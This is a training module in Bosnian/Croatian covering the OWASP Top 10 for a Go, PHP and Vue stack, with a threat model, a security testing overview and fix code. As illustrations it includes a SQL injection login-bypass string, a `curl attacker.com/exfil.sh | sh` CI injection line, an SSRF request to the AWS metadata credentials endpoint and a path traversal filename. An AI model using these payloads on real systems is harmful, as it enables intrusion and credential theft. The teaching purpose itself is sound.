# 01 — AppSec Pregled i OWASP Top 10

## Zašto AppSec nije isto što i Infrastructure Security

Modul 15 je pokrio **infrastructure security**: mreže, IAM, Secrets Manager, VPC, security grupe, TLS certifikati. To su slojevi ispod aplikacije — infrastruktura na kojoj aplikacija radi.

**Application security** je sloj unutar koda same aplikacije:
- Da li Go backend prihvata netretirani SQL input?
- Da li Vue.js renderuje untrusted HTML?
- Da li PHP proxy leakuje stack trace u error response?
- Da li JWT sadrži sensitive podatke i je li kratkotrajan?

Infra security je zaštita zgrade — AppSec je zaštita od lopova koji su već unutra.

---

## OWASP Top 10 (2021) Mapiran na Naš Stack

OWASP (Open Web Application Security Project) Top 10 je lista najčešćih i najopasnijih web ranjivosti. Verzija 2021 je aktuelna.

### A01 — Broken Access Control

**Opis:** Korisnik može pristupiti resursima kojima ne smije.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| Go backend | VISOK | Endpoint `/api/admin/users` ne provjerava je li korisnik admin |
| PHP proxy | SREDNJI | Proxy prosljeđuje request bez provjere JWT scope-a |
| Vue.js | NIZAK | Frontend sakrije dugme, ali API ne blokira akciju |

**Realni vektor:** Frontend skrije "Admin panel" link, ali Go endpoint `/api/v1/admin/export` je dostupan svakome tko pošalje validan JWT token — bez provjere role.

**Fix:** Go middleware koji provjerava `role` claim iz JWT-a:
```go
func RequireRole(role string) gin.HandlerFunc {
    return func(c *gin.Context) {
        claims := c.MustGet("claims").(*JWTClaims)
        if claims.Role != role {
            c.AbortWithStatusJSON(403, gin.H{"error": "insufficient permissions"})
            return
        }
        c.Next()
    }
}
```

---

### A02 — Cryptographic Failures

**Opis:** Slaba enkripcija, lozinke u plaintextu, nezaštićeni podaci.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| Go backend | VISOK | MD5/SHA1 za lozinke, HTTP umjesto HTTPS |
| MySQL 8.0 | VISOK | Lozinke u plaintextu u bazi |
| Redis 7 | SREDNJI | Session data bez TLS unutar clustera |

**Realni vektor:** Developer koristi `sha256(password)` jer je "brz i siguran za hashing". Brute-force rainbow table napad razbija sve lozinke za nekoliko sati.

**Fix:** bcrypt cost=12 (modul 04 detaljno pokriva ovo).

---

### A03 — Injection

**Opis:** SQL injection, command injection, LDAP injection.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| Go backend | VISOK | `fmt.Sprintf("SELECT * FROM users WHERE email='%s'", email)` |
| PHP proxy | VISOK | `shell_exec("grep " . $input . " /var/log/app.log")` |
| Vue.js | SREDNJI | `v-html` s user contentem — DOM-based XSS |

**Realni vektor:** Login forma, polje email: `' OR '1'='1' --` → bypass autentikacije.

**Fix:** Prepared statements u Go, `filter_var()` u PHP (modul 02 detaljno).

---

### A04 — Insecure Design

**Opis:** Arhitekturalne greške koje se ne mogu ispraviti samo patching-om.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| API dizajn | VISOK | Reset lozinke radi samo na osnovu email-a, bez secondary factor |
| Auth flow | SREDNJI | JWT refresh token bez revokacije mehanizma |

**Realni vektor:** "Zaboravi lozinku" šalje novi password na email — napadač koji ima pristup emailu preuzima nalog. Siguran dizajn: šalje se time-limited token, korisnik sam unosi novu lozinku.

---

### A05 — Security Misconfiguration

**Opis:** Default konfiguracije, otvoreni portovi, verbose error messages.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| PHP | VISOK | `display_errors = On` u produkciji |
| Go | SREDNJI | Stack trace vraćen u API error response |
| nginx | SREDNJI | `Server: nginx/1.24.0` header otkriva verziju |
| MySQL | VISOK | Root user bez lozinke, dostupan izvana |

**Realni vektor:** PHP stack trace u response-u otkriva: baza podataka je na `db.internal:3306`, koristi se `slim/slim ^4.12.0`, i metodu `UserRepository::findByEmail()`. Napadač dobiva strukturu koda i internu topologiju.

**Fix u PHP:**
```php
// php.ini za produkciju
display_errors = Off
log_errors = On
error_log = /var/log/php/error.log
```

---

### A06 — Vulnerable and Outdated Components

**Opis:** Biblioteke s poznatim CVE-ovima.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| npm paketi | VISOK | Log4Shell-ekvivalent u npm ekosistemu |
| Composer | VISOK | PHP biblioteka s poznatim RCE CVE-om |
| Go moduli | SREDNJI | `golang.org/x/crypto` star verzija |

**Realni vektor:** Polyfill.io incident (2024): CDN je kompromitovan, inject-ao je maliciozni JS u milione web stranica. Lekcija: ne koristiti eksterne CDN-ove za skripte.

**Fix:** `govulncheck`, `npm audit`, `composer audit`, GitLab Dependency Scanning (modul 05).

---

### A07 — Identification and Authentication Failures

**Opis:** Slaba autentikacija, brute-force, credential stuffing.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| Go auth service | VISOK | Nema rate limiting na `/api/auth/login` |
| JWT | VISOK | Token ne expiruje, nema revokacije |
| Redis | SREDNJI | Session podaci nisu zaštićeni |

**Realni vektor:** Napadač ima listu od 10 milijuna email/lozinka kombinacija s prethodnih breachova (credential stuffing). Login endpoint bez rate limitinga → automatizovani napadi.

**Fix:** Redis rate limiting, account lockout, bcrypt (modul 04 detaljno).

---

### A08 — Software and Data Integrity Failures

**Opis:** Neprovjereni update-i, insecure CI/CD pipeline.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| GitLab CI/CD | VISOK | Pipeline izvršava kod iz neprovjerenog MR-a |
| Docker images | SREDNJI | `FROM node:latest` — nepoznat sadržaj |
| npm/Composer | SREDNJI | `npm install` bez `package-lock.json` |

**Realni vektor:** Napadač otvori MR u open-source projektu s "malim ispravkom" koji u CI/CD injektuje `curl attacker.com/exfil.sh | sh`.

**Fix:** Pin Docker image versije (`FROM node:20.15.1-alpine`), koristiti `package-lock.json` i `composer.lock`, GitLab protected branches.

---

### A09 — Security Logging and Monitoring Failures

**Opis:** Ne logujemo security evente, ne detektujemo napade.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| Go backend | VISOK | Neuspješni login ne loguje IP adresu |
| PHP proxy | SREDNJI | 401/403 greške nisu alarmantne |
| Kubernetes | SREDNJI | Nema audit log-a za kubectl akcije |

**Realni vektor:** Napadač izvede credential stuffing napad na 50,000 naloga tokom 3 dana. Jer nema alerta na povećan broj 401 grešaka, ne saznamo sve dok korisnici ne počnu žaliti se.

**Fix:** Loguj sve auth evente (uspješne i neuspješne) s IP-om, user agentom, timestamp-om. Prometheus alert na povećan broj 401-ica u kratkom vremenu.

---

### A10 — Server-Side Request Forgery (SSRF)

**Opis:** Aplikacija dohvaća URL koji joj pošalje korisnik → napadač targetira interne servise.

| Komponenta | Rizik | Primjer |
|------------|-------|---------|
| PHP proxy | VISOK | `$client->get($_POST['url'])` — dohvaća bilo koji URL |
| Go backend | SREDNJI | Webhook handler koji dohvaća callback URL bez validacije |

**Realni vektor:** PHP proxy prima `url` parametar za "preview linka". Napadač šalje `http://169.254.169.254/latest/meta-data/iam/security-credentials/` — AWS EC2 metadata endpoint. Dobiva IAM kredencijale instance.

**Fix u PHP:**
```php
function validateAllowedUrl(string $url): bool {
    $parsed = parse_url($url);
    $allowedHosts = ['api.partner.com', 'cdn.firma.com'];
    
    // Zabrani private IP range-ove
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        return false;
    }
    return in_array($parsed['host'], $allowedHosts);
}
```

---

## Threat Model za Project-A

Threat modeling je strukturovano razmišljanje: **"Šta napadač može napasti i kojim putem?"**

### Realni Vektori Napada

#### 1. Login Endpoint (`POST /api/auth/login`)
```
Napadač → Internet → nginx → PHP proxy → Go auth service → MySQL
```
- **Credential stuffing:** Automatizovano isprobavanje leaked email/password kombinacija
- **Brute force:** Direktan napad na jednog korisnika
- **SQL injection:** Maliciozni email unos
- **Timing attack:** Razlika u response time-u za existing vs non-existing email

**Rizik: KRITIČAN** — ovo je najnapadaniji endpoint.

#### 2. API Endpoints (autenticirani)
```
Napadač (s validnim JWT) → nginx → PHP proxy → Go backend → MySQL/Redis
```
- **Broken access control:** Korisnik pristupa tuđim podacima (`/api/users/123` umjesto `/api/users/456`)
- **Injection:** SQL, command injection u filtrima i search parametrima
- **Insecure direct object reference (IDOR):** Predvidljivi ID-ovi (`/api/orders/1001` → probaj `1000`, `999`)

**Rizik: VISOK**

#### 3. File Upload (ako postoji)
```
Korisnik → Vue.js → PHP proxy → Go backend → S3/EBS
```
- **Malicious file upload:** PHP webshell maskiran kao slika
- **Path traversal:** `../../etc/passwd` u filename-u
- **DoS:** Upload 10GB fajlova

**Rizik: VISOK**

#### 4. JWT Token
```
localStorage (Vue) → HTTP header → Go backend JWT validator
```
- **XSS ukrade token iz localStorage:** Napadač inject-uje JS koji čita `localStorage.getItem('token')`
- **Token bez expiry:** Stolen token radi zauvijek
- **Weak signing key:** HS256 s kratkim keyem je brute-forceable

**Rizik: SREDNJI do VISOK**

#### 5. Supply Chain (CI/CD i Dependencies)
```
npm/Composer/Go modules → GitLab CI → Docker image → EKS
```
- **Kompromitovana dependenca:** Maliciozni paket dodan u popularnu biblioteku
- **GitLab CI secret leakage:** Loše konfigurisan pipeline eksponira AWS/DB kredencijale

**Rizik: SREDNJI**

---

## Security Testing Piramida

```
        /\
       /  \
      / P  \      PENTEST (Manual)
     / e n  \     — jednom godišnje ili pred release
    / t e s  \    — skup, ali pronalazi logičke greške
   /  t t t  \    — OWASP Testing Guide
  /____________\
 /              \
/   D A S T      \   DAST (Dynamic)
/   dynamic scan  \  — OWASP ZAP u CI/CD (staging)
/_________________ \  — testira running app
/                   \
/       S A S T      \  SAST (Static)
/   static code scan  \ — GitLab SAST, Semgrep
/_____________________ \ — svaki commit, brzo (< 5 min)
```

### SAST — Static Application Security Testing
- **Šta:** Analiza izvornog koda bez pokretanja aplikacije
- **Kada:** Svaki commit/push u CI/CD pipeline
- **Alati za naš stack:** GitLab SAST (ugrađeno), Semgrep
- **Prednost:** Brzo (sekunde do minuta), pronalazi greške rano
- **Mana:** False positives, ne pronalazi runtime logičke greške
- **Detalji:** Modul 06

### DAST — Dynamic Application Security Testing
- **Šta:** Testira running aplikaciju (black-box)
- **Kada:** Na staging environmentu, nakon deploya
- **Alati za naš stack:** OWASP ZAP
- **Prednost:** Pronalazi realne ranjivosti (ne false positives teorije)
- **Mana:** Sporije (minuti do sati), može uzrokovati probleme na bazi
- **Detalji:** Modul 07

### Dependency Scanning
- **Šta:** Provjerava biblioteke protiv poznatih CVE-ova (NVD database)
- **Kada:** Svaki commit, i periodički (Renovate Bot dnevno)
- **Alati:** `govulncheck`, `npm audit`, `composer audit`, GitLab Dependency Scanning
- **Detalji:** Modul 05

### Pentest (Manual)
- **Šta:** Stručnjak ručno testira aplikaciju po OWASP Testing Guide metodologiji
- **Kada:** Jednom godišnje, pred veliki release, ili pri regulatornim zahtjevima
- **Prednost:** Pronalazi kompleksne logičke greške koje automati ne vide
- **Mana:** Skupo, vremenski zahtjevno

---

## Redosljed Prioriteta za Project-A

Na osnovu threat modela, preporučen redosljed implementacije:

1. **Odmah** (modul 02-04): Input validation, SQL injection fix, auth security
2. **Ovaj sprint** (modul 05-06): SAST u CI/CD, dependency scanning
3. **Sljedeći sprint** (modul 07): DAST na staging
4. **Kvartalno**: Security headers audit, review access control
5. **Godišnje**: Pentest

Sigurnost nije jednokratna aktivnost — to je kontinuiran proces.
